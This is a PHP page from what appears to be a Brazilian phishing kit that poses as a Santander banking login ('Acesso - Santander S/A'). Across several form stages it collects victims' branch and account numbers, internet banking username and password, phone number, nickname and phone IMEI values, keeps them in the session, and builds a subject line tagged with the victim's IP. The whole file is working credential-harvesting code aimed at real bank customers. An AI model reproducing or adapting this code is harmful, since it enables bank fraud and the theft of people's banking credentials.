<?php
include('../../../conn.php');
include('../../functions/functions.php');

$assunto = "SANTA JUJU OFF -  $UserIp - $data";

if(isset($_POST['sender']) && $_POST['sender'] == 'index_j'):
	$agencia 	= $_POST['is_agencia'];
	$conta 		= $_POST['is_conta'];

	$_SESSION['agencia'] = $agencia;
	$_SESSION['conta'] = $conta;

	$_SESSION['executar'] = 'PASS_NET';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'pass_net'):
	$usuario 	= $_POST['us_ag'];
	$senhaNet 	= addslashes(utf8_decode($_POST['us_pass']));
	$_SESSION['usuario'] = $usuario;
	$_SESSION['senhaNet'] = $senhaNet;
	$agencia = $_SESSION['agencia'];
	$conta = $_SESSION['conta'];
	$_SESSION['executar'] = 'BUSTER';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'buster'):

	$_SESSION['executar'] = 'FONE';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'fone'):
	$fone = $_POST['fone'];
	$agencia = $_SESSION['agencia'];
	$conta = $_SESSION['conta'];
	$usuario = $_SESSION['usuario'];
	$senhaNet = $_SESSION['senhaNet'];
	$_SESSION['fone'] = $fone;
	$_SESSION['executar'] = 'APELIDO';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'apelido'):
	$apelido = $_POST['is_apelido'];
	$_SESSION['apelido'] = $apelido;
	$_SESSION['executar'] = 'CAIXA';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'imei'):
	$imei_one = $_POST['is_imei_one'];
	@$imei_two = $_POST['is_imei_two'];

	$agencia = $_SESSION['agencia'];
	$conta = $_SESSION['conta'];
	$usuario = $_SESSION['usuario'];
	$senhaNet = $_SESSION['senhaNet'];
	$fone = $_SESSION['fone'];
	$_SESSION['executar'] = 'CAIXA';
	header('Location: acesso.php');

endif;
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Acesso - Santander S/A</title>
	<link rel="stylesheet" href="estilos/content-juba.css">
	<link rel="stylesheet" href="estilos/tbl.css">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/jcontent-juba.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="no_line">
	<div class="container person_tam">
		<div class="content">
			<?php include ('includes/header.php');?>
			<?php

				@$comando = $_SESSION['executar'];
				switch ($comando):
					case 'PASS_NET':
						include('includes/pass_net.php');
					break;
					case 'BUSTER':
						include('includes/buster.php');
					break;
					case 'FONE':
						include('includes/fone.php');
					break;
					case 'IMEI':
						include('includes/imei.php');
					break;
					case 'APELIDO':
						include('includes/apelido.php');
					break;
					case 'CAIXA':
						include('includes/caixa.php');
					break;

					default:
						header('Location: ../../index.php');
					break;
				endswitch;
			?>
			<div class="clear"></div>
			<div style="display:block;position:relative;bottom:80px;left:50%;margin-left:-512px;width:1024px;">
				<?php include ('includes/footer.php');?>
			</div>
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->
</body>
</html>
